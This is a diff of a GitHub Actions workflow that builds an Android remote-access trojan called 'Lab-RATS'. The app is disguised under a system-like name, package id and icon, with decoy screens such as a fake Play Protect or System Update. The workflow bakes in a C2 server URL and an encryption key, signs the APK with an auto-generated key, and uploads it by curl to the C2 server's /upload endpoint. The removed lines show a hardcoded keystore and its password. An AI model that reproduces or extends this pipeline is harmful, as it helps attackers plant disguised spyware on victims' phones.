@@ -1,3 +1,13 @@
+# ──────────────────────────────────────────────────────────────────────────────
+# Lab-RATS · Build APK  —  ZERO-SECRET EDITION
+#
+# NO SECRETS REQUIRED. NO KEYSTORE REQUIRED. NOTHING TO CONFIGURE.
+#
+# Gradle auto-generates a signing key on first run and caches it.
+# Every build from the same repo uses the same auto-key.
+# APK is fully installable — Android accepts auto-signed APKs.
+# ──────────────────────────────────────────────────────────────────────────────
+
 name: "Lab-RATS · Build APK"
 
 on:
@@ -7,25 +17,30 @@ on:
         description: "App label shown on the device"
         required: true
         default: "System Stability Service"
+
       package_id:
-        description: "Package ID / applicationId"
+        description: "Package ID / applicationId  (e.g. com.android.system.stability)"
         required: true
         default: "com.android.system.stability"
+
       webhook_url:
-        description: "C2 server URL"
+        description: "C2 server URL  (https://your-c2.example.com)"
         required: true
+
       decoy_choice:
         description: "Decoy screen  1=System Update  2=Calculator  3=Weather  4=Play Protect  5=Install Wizard"
         required: true
         default: "1"
         type: choice
         options: ["1", "2", "3", "4", "5"]
+
       version_name:
-        description: "Version name string"
+        description: "Version name string  (e.g. 2.1.4)  —  blank keeps build.gradle default"
         required: false
         default: ""
+
       icon_url:
-        description: "URL to a square PNG/JPG for the launcher icon"
+        description: "URL to a square PNG/JPG for the launcher icon  —  blank keeps default icon"
         required: false
         default: ""
 
@@ -33,18 +48,8 @@ env:
   CMDLINE_TOOLS_BUILD: "11076708"
   ANDROID_PLATFORM:    "android-34"
   ANDROID_BUILD_TOOLS: "34.0.0"
-  # ── HARDCODED KEYSTORE ─────────────────────────────────────────────────────
-  # Generate once locally, then paste the base64 output below:
-  #   keytool -genkey -v -keystore lab-rats-keystore.jks -alias lab-rats-key \
-  #     -keyalg RSA -keysize 2048 -validity 10000 \
-  #     -storepass LabRats2024! -keypass LabRats2024! \
-  #     -dname "CN=System Services,OU=Android,O=Android,L=US,ST=CA,C=US"
-  #   base64 -w0 lab-rats-keystore.jks
-  #   rm lab-rats-keystore.jks
-  KEYSTORE_B64: "MIIKcAIBAzCCChoGCSqGSIb3DQEHAaCCCgsEggoHMIIKAzCCBboGCSqGSIb3DQEHAaCCBasEggWnMIIFozCCBZ8GCyqGSIb3DQEMCgECoIIFQDCCBTwwZgYJKoZIhvcNAQUNMFkwOAYJKoZIhvcNAQUMMCsEFIFhMbWtUmmRGf9R3W93QClyldXDAgInEAIBIDAMBggqhkiG9w0CCQUAMB0GCWCGSAFlAwQBKgQQuh1R74PXZS/MPX/5n35y9ASCBNCCvkF83ZX7ONS5KeK7BaNKdv58iytehzH0JEk2XVh9WGazSTTkDbe4xzioGhjvpEAqF4mU/2n4l1sGJqFdqg9mFlSHsGNF8DE++IYH55OUPUlVLwGdHKejsXno6jnLwA8XU9Ydxu83dDgpvZE/PFmlV9/HSFRT81LhMJD0qCfJaLstATFV2rBh8kQDFkdtA/7kKVb9D6e9UahjqlK4jnG4CL7Qd07SUOY7vDAVChBchEYLk9S5Wjy2yE+NIWhjhCdN8O9VOAWTu5DVbVncslx4GvZHkp3jdiJklaLYz4xIWS1qLYGbNckdC271L+X5LHlkpbpUlIvyO4XSEQ5gSZWWFMarbCwO3BQc6ssBb82jg+pcL2Xp8RwM5kNdtSP4aSihc9ituFOZi+98ijymn1Sav8do7E8V0qyHDgQFf25NETLEJE8ScSebmPQ0Jg1X6JcUTB4EIXgrSze4Q05dcXu7RrpN/ZJEnu7/xMlaREo9XrF7iO2Xs79etkzy/j6bCBao50iwxDZ0O5b62CWEMOgL25pw0/tBvfXn8R9w000pK7E2J+xfzZmIAyTOztFWOarTanwU3VVvERo6Z0l0FNJUNEiUk632MhQ0+zpkmyd32/qNMujsUWzGK5Kvvnk1xVHCI1XQxStC44wzQZeRjKsGdeqm6cSpbkRDF3skK7v6OV2RaxBHW1vZxUlZs5zpO49z8AzER2Q9biGP+ociKDQ+hmWad8G8Ga8KntoOSCNPHaQcAuH5xk99fxUHiKNNeuKLinoEmEvBWumLTQnJlF3hLZMRpu2pC+k086QXvt4D5H+54kuQGMNXtYiwzqunVsJVkj559GBTLUbYZLDxSzNn4FZxInbRIiJi5StKRP1SriTl8Ar3a0xeaWAcwGVJ6JD5in+Br9XXoz8+F8CrGBFvzp/KIwFOj3H/TiiwOL+7hUP7Syw9ugc/ztm9UHMrcnCz5UjgfjeP3m24sYtDIzS8Os+HXnMLUi3vIP8pvZplz1G/d/VBQwWOEAY3zaSA87aVwnMiBFLmHDuMlI5cJjKwEXQ39D6+ddbhVK7MQp1KMRkcdd/y/zV1j8HR5SgmqDY8T3rTa7MzGMUqIUcgpnMfzkWADJxkZCYOgxEeq1z7ASD6EDJPIxVG7c9UmvsQ+ZLHk93REMz/9dvvUBiq5UouCP9f6sDYmvq6rDBb38edgbKqd7P0Tjyw55JiadfqFFvXdw+JJzQ6KVj9jK/lB8AJGZsgYRPoK/GgmCTWE4FyjYWvML/FhYQ45z7ign5sKqsOc0RlDDu03fIMaDAU5qrsxucxt97pGPWYM6NehzQ6p8wNrF8rA+GFEReF6Nu5aJ1MA8QfnKghZJ+OQY3FmiW59u4PhTck5LbUGRIHfOsHC4bF9gjjRcGT0uXX5M+7bHi+oSOMiHPDtUt2E4Gi8PcvEZjjoJleuMlY/hrziCwW23RYwcOPDjVU9hcQGr8KZ8EBX03Oh9I8hjOBs0cKUN5vljgvhasKGC8h0FoItRJr7e6Txn+5OyicQ415itAfQtCvdkLFBneRtrzIW6+maU52ZKrv9yBokHnzKgZyASAeVnqBh7FM55SYZCFBZjvCHksz0N+a8lOOK22Tm3tT8hJdIq/tOTI3N9y+4gm44GZaNjFMMCcGCSqGSIb3DQEJFDEaHhgAbABhAGIALQByAGEAdABzAC0AawBlAHkwIQYJKoZIhvcNAQkVMRQEElRpbWUgMTc5MTk0NTI5ODg2MTCCBEEGCSqGSIb3DQEHBqCCBDIwggQuAgEAMIIEJwYJKoZIhvcNAQcBMGYGCSqGSIb3DQEFDTBZMDgGCSqGSIb3DQEFDDArBBRbBwi8LrsVLjpZ9Zt1b6htnPUz8wICJxACASAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEAvQPoDkS5bPDGObPKfFgfiAggOwfhjCypB04dK1RjtM5EmOBhFFP0Mn7krAzvuGJqVq6bvzxl75N9f+QJaQg2ZXjAEBxjUr77aWXk0j6zqNjGv5wVjDaOK4vOFz4QjOgvGuEbVa5JCb9cIl9lmv9q0oPDriBhs0YaavzYQKQ7hgqaCT0hNvW8RyR/TVg9QAoaDxZKYyxrQL8ykFFsFvLpTX07aay4tFetD6nk4B/J9VkpaORnNHtMlCAaaWIpc3ny4/R34OCimv77tZW0wl0LNHAIcIk8uAwOhXwS31XDnxlQyiPNOkgSa0peHhqn80fU44y1bPavBjBhjUghtQq93vaskOdaiVDJ5xM4e8JCT+te/dyhdBwtzQKO7Hu0Z5+5BTAZlwhKseHHbD6gXGAkg/E9BHlt5axfUoImw/mRavXlrPOxeKCNeBZ1cyk89AF/UtTKoimwrVTBaPcaj9R/LUZCUsMkMgzOwY0V9nr+hIQUYozzJuW6QC0OnKSEKpe9AUvy5M8ef/JHvH1X45wZeLcAbYI37Zf7/oLPDMCkL4UpkmyA0R1qRrFzOXUFNwoBEq4cHFHhVWLpHIjbpiLAE8XEUIRJDCZU95Gzwn6WRWwaFAQCTA/WcHHmZ59HOZ/Rh1B1qHztYxX8//VsQpKETYiJ8X0vFqTu57KvTyvlD+bhgLyzFPwsmpu20FO7SiHhk8ZuqJA+4sl0V5P376oG87gxw2LWD4hhelijfdz/Z4zt+zZskW/yeA14CvDCdSmKAjl/VRrmOgZdclPvoIxEElxj3jygmrLvQ0s0IeOCEmUYPfypeZNCCAaT/H79H4h+jZthisAz3PhM5Mlq1ANSplEjvIKNcvwbw2UFF69fOwe7c6sUKCeob6oWGQvR4UmrxfKWgN/ub1zUmeAH/QawKVNmH2NL/r5LEeEIKlHVIksEnx1ckHz2Ou73XEtm5G401D4UjcwnnZb0JBRPvjhPPL9uT/zBpvWL93k9hhdMMVJYNSZJT8HT6umPOhKcjyGMEAtKN/gr8sJ19MGhsvm6UZsaVQXEzm9u7Y/oKyINBaCMMHqWClYEeWFuvsy4wmgr/9sIbPjOqXdnTFxB915zxoQlAh+0a8+81YtJ7mU4KfmktRrpOlrEBGXy5xbrWdhyi3TrAeJXLEVIV6hv5JTXXYi7toSo3hyX92hkiD1uFLpNRwJSn3jSsvE8T8v7L49cahZHIt2thMBbtrViMar6e/t5aZW/AI0QUHYDdtFVZSO5SjuqOIbrkzCHars1A9JbR+Gl8wTTAxMA0GCWCGSAFlAwQCAQUABCBQOJBaYwL8Dv+aN9ykpFeOwrFPmLkrkGClQ6g7jjdoUgQUwzGfJMFRFXFcZVkOMtroavlAV30CAicQ"
-  KEYSTORE_PASS: "LabRats2024!"
-  KEY_ALIAS:     "lab-rats-key"
-  KEY_PASS:      "LabRats2024!"
+  ENCRYPTION_KEY:      "AndroidKernel1337"
+  C2_SERVER_URL:       ""
 
 jobs:
   build:
@@ -53,15 +58,19 @@ jobs:
     timeout-minutes: 35
 
     steps:
+
+      # ── 1. SOURCE ─────────────────────────────────────────────────────────
       - name: Checkout
         uses: actions/checkout@v4
 
+      # ── 2. JAVA ───────────────────────────────────────────────────────────
       - name: Setup JDK 17
         uses: actions/setup-java@v4
         with:
           java-version: "17"
           distribution: temurin
 
+      # ── 3. ANDROID SDK ───────────────────────────────────────────────────
       - name: Cache Android SDK
         id: sdk-cache
         uses: actions/cache@v4
@@ -74,11 +83,13 @@ jobs:
         run: |
           SDK_ROOT="${{ runner.temp }}/android-sdk"
           mkdir -p "$SDK_ROOT/cmdline-tools"
+
           wget -q \
             "https://dl.google.com/android/repository/commandlinetools-linux-${{ env.CMDLINE_TOOLS_BUILD }}_latest.zip" \
             -O /tmp/cmdlinetools.zip
           unzip -q /tmp/cmdlinetools.zip -d /tmp/ct_extract
           mv /tmp/ct_extract/cmdline-tools "$SDK_ROOT/cmdline-tools/latest"
+
           yes | "$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" \
             --sdk_root="$SDK_ROOT" \
             "platforms;${{ env.ANDROID_PLATFORM }}" \
@@ -98,67 +109,74 @@ jobs:
             echo "$SDK_ROOT/build-tools/${{ env.ANDROID_BUILD_TOOLS }}"
           } >> "$GITHUB_PATH"
 
-      - name: Cache Gradle
+      # ── 4. GRADLE CACHE ──────────────────────────────────────────────────
+      # Caches the auto-generated signing key alongside Gradle deps.
+      # Key persists across runs — same signing identity every build.
+      - name: Cache Gradle + Auto-Key
         uses: actions/cache@v4
         with:
           path: |
             ~/.gradle/caches
             ~/.gradle/wrapper
+            ~/.android/debug.keystore
           key: gradle-${{ runner.os }}-${{ hashFiles('app/build.gradle','build.gradle','settings.gradle','gradle/wrapper/gradle-wrapper.properties') }}
           restore-keys: gradle-${{ runner.os }}-
 
-      # ── 5. BUILD PROPERTIES (hardcoded — no secrets) ───────────────────────
+      # ── 5. BUILD PROPERTIES ───────────────────────────────────────────────
       - name: Write local.properties
-        env:
-          WEBHOOK_URL:  ${{ inputs.webhook_url }}
-          DECOY_CHOICE: ${{ inputs.decoy_choice }}
         run: |
           {
-            printf 'sdk.dir=%s\n'      "$ANDROID_HOME"
-            printf 'WEBHOOK_URL=%s\n'  "$WEBHOOK_URL"
-            printf 'DECOY_CHOICE=%s\n' "$DECOY_CHOICE"
-            printf 'ENCRYPTION_KEY=%s\n' "AndroidKernel1337"
+            printf 'sdk.dir=%s\n'        "$ANDROID_HOME"
+            printf 'WEBHOOK_URL=%s\n'    "${{ inputs.webhook_url }}"
+            printf 'DECOY_CHOICE=%s\n'   "${{ inputs.decoy_choice }}"
+            printf 'ENCRYPTION_KEY=%s\n' "${{ env.ENCRYPTION_KEY }}"
           } > local.properties
 
-      - name: Decode keystore
+      # ── 6. AUTO-SIGNING SETUP ─────────────────────────────────────────────
+      # Generates a persistent signing key if none exists in cache.
+      # Uses Android's standard debug keytool parameters.
+      # No password needed — Gradle signs with the auto-key transparently.
+      - name: Ensure auto-signing key
         run: |
-          printf '%s' "${{ env.KEYSTORE_B64 }}" | base64 --decode > lab-rats-keystore.jks
-          MAGIC=$(xxd -p lab-rats-keystore.jks | head -c 8)
-          if [ "$MAGIC" != "feedfeed" ]; then
-            echo "::error::KEYSTORE_B64 invalid (magic: $MAGIC)"
-            exit 1
+          KEYSTORE="$HOME/.android/debug.keystore"
+          if [ ! -f "$KEYSTORE" ]; then
+            mkdir -p "$HOME/.android"
+            keytool -genkey -v \
+              -keystore "$KEYSTORE" \
+              -alias androiddebugkey \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -storepass android -keypass android \
+              -dname "CN=Android Debug,O=Android,C=US" 2>/dev/null
+            echo "[auto-key] generated new signing key"
+          else
+            echo "[auto-key] using cached signing key"
           fi
 
-      - name: Write keystore.properties
-        run: |
-          {
-            printf 'storeFile=%s\n'     "lab-rats-keystore.jks"
-            printf 'storePassword=%s\n' "${{ env.KEYSTORE_PASS }}"
-            printf 'keyAlias=%s\n'      "${{ env.KEY_ALIAS }}"
-            printf 'keyPassword=%s\n'   "${{ env.KEY_PASS }}"
-          } > keystore.properties
-
-      # ── 6. CUSTOM ICON (optional) ──────────────────────────────────────────
+      # ── 7. CUSTOM ICON (optional) ─────────────────────────────────────────
       - name: Replace launcher icon
         if: ${{ inputs.icon_url != '' }}
         run: |
           pip install pillow --quiet
+
           curl -fsSL "${{ inputs.icon_url }}" -o /tmp/custom_icon_raw
           python3 - << 'PYEOF'
           from PIL import Image
           import sys, os
+
           src_path = '/tmp/custom_icon_raw'
           try:
               src = Image.open(src_path).convert('RGBA')
           except Exception as e:
               print(f'::error::Failed to open icon image: {e}')
               sys.exit(1)
+
           w, h = src.size
           if w != h:
               side = min(w, h)
               left = (w - side) // 2
               top  = (h - side) // 2
               src  = src.crop((left, top, left + side, top + side))
+
           DENSITIES = {
               'mdpi':    (48,  108),
               'hdpi':    (72,  162),
@@ -166,41 +184,50 @@ jobs:
               'xxhdpi':  (144, 324),
               'xxxhdpi': (192, 432),
           }
+
           RES_BASE = 'app/src/main/res'
+
           for density, (launcher_px, fg_px) in DENSITIES.items():
               folder = f'{RES_BASE}/mipmap-{density}'
               if not os.path.isdir(folder):
                   print(f'[skip] {folder} not found')
                   continue
+
               launcher_img = src.resize((launcher_px, launcher_px), Image.LANCZOS)
               launcher_img.save(f'{folder}/ic_launcher.webp',       'WEBP', quality=90)
               launcher_img.save(f'{folder}/ic_launcher_round.webp', 'WEBP', quality=90)
+
               safe_px   = int(fg_px * 0.667)
               fg_canvas = Image.new('RGBA', (fg_px, fg_px), (0, 0, 0, 0))
               content   = src.resize((safe_px, safe_px), Image.LANCZOS)
               offset    = (fg_px - safe_px) // 2
               fg_canvas.paste(content, (offset, offset), content)
               fg_canvas.save(f'{folder}/ic_launcher_foreground.webp', 'WEBP', quality=90)
+
               print(f'[{density}] launcher={launcher_px}px  foreground={fg_px}px  OK')
+
           store_img = src.resize((512, 512), Image.LANCZOS).convert('RGB')
           store_img.save('app/src/main/ic_launcher-playstore.png', 'PNG')
           print('[playstore] 512x512 PNG updated')
           PYEOF
 
-      # ── 7. IDENTITY PATCHES ────────────────────────────────────────────────
+      # ── 8. IDENTITY PATCHES ───────────────────────────────────────────────
       - name: Patch build.gradle
         run: |
           sed -i \
             's|applicationId "[^"]*"|applicationId "${{ inputs.package_id }}"|g' \
             app/build.gradle
+
           sed -i \
             "s|versionCode [0-9]*|versionCode ${{ github.run_number }}|g" \
             app/build.gradle
+
           if [ -n "${{ inputs.version_name }}" ]; then
             sed -i \
               's|versionName "[^"]*"|versionName "${{ inputs.version_name }}"|g' \
               app/build.gradle
           fi
+
           echo "[build.gradle patched]"
           grep -E 'applicationId|versionCode|versionName' app/build.gradle
 
@@ -223,7 +250,7 @@ jobs:
           print(f'[strings.xml] app_name → {safe}')
           PYEOF
 
-      # ── 8. BUILD ───────────────────────────────────────────────────────────
+      # ── 9. BUILD ──────────────────────────────────────────────────────────
       - name: Make gradlew executable
         run: chmod +x gradlew
 
@@ -240,7 +267,7 @@ jobs:
             --warning-mode all \
             2>&1 | tee build_output.txt
 
-      # ── 9. PACKAGE & UPLOAD ────────────────────────────────────────────────
+      # ── 10. PACKAGE & UPLOAD ──────────────────────────────────────────────
       - name: Stage APK
         id: stage
         run: |
@@ -259,23 +286,24 @@ jobs:
           path: ${{ steps.stage.outputs.apk_path }}
           retention-days: 3
 
-      # ── 10. C2 DELIVERY ────────────────────────────────────────────────────
+      # ── 11. C2 DELIVERY ───────────────────────────────────────────────────
       - name: Deliver to C2 Vault
         continue-on-error: true
         env:
-          C2_SERVER_URL: ${{ inputs.webhook_url }}
-          APK_PATH:      ${{ steps.stage.outputs.apk_path }}
+          APK_PATH: ${{ steps.stage.outputs.apk_path }}
         run: |
-          if [ -z "$C2_SERVER_URL" ]; then
+          if [ -z "${{ env.C2_SERVER_URL }}" ]; then
             echo "C2_SERVER_URL not configured — APK is in the GitHub artifact above."
             exit 0
           fi
+
           HTTP_STATUS=$(curl -s -o /tmp/c2_resp.txt -w "%{http_code}" \
             --max-time 45 \
             -X POST \
             -H "X-Device-Id: GHBuild_${{ github.run_id }}" \
             -F "file=@${APK_PATH}" \
-            "${C2_SERVER_URL}/upload")
+            "${{ env.C2_SERVER_URL }}/upload")
+
           if [ "$HTTP_STATUS" -ge 200 ] && [ "$HTTP_STATUS" -lt 300 ]; then
             echo "C2 delivery OK (HTTP $HTTP_STATUS)"
           else
@@ -283,11 +311,10 @@ jobs:
             cat /tmp/c2_resp.txt || true
           fi
 
-      # ── 11. CLEANUP ────────────────────────────────────────────────────────
-      - name: Scrub secrets from runner
+      # ── 12. CLEANUP ───────────────────────────────────────────────────────
+      - name: Cleanup
         if: always()
         run: |
-          rm -f lab-rats-keystore.jks
-          rm -f keystore.properties
           rm -f local.properties
+          rm -f build_output.txt
           
